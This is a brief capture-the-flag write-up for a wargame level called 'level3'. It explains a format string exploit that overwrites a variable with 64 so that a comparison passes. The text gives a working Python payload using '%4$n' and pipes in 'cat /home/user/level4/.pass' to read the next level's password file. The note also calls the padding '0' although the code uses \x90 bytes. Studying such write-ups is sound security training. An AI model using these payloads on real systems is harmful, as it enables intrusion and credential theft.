in the source, we need to overwrite m to be equal to 64,  so that it passes the cmp

(python -c 'print("\x08\x04\x98\x8c"[::-1] + "\x90"*(64-4) + "%4$n")' && echo 'cat /home/user/level4/.pass') | ./level3
"Since we need to write 64 into m, we write 64 characters (4 from the address of m and 60 from the "0" padding). Then, we use the %n format specifier to record the count of bytes written so far into the fourth argument, which is m's address."

https://owasp.org/www-community/attacks/Format_string_attack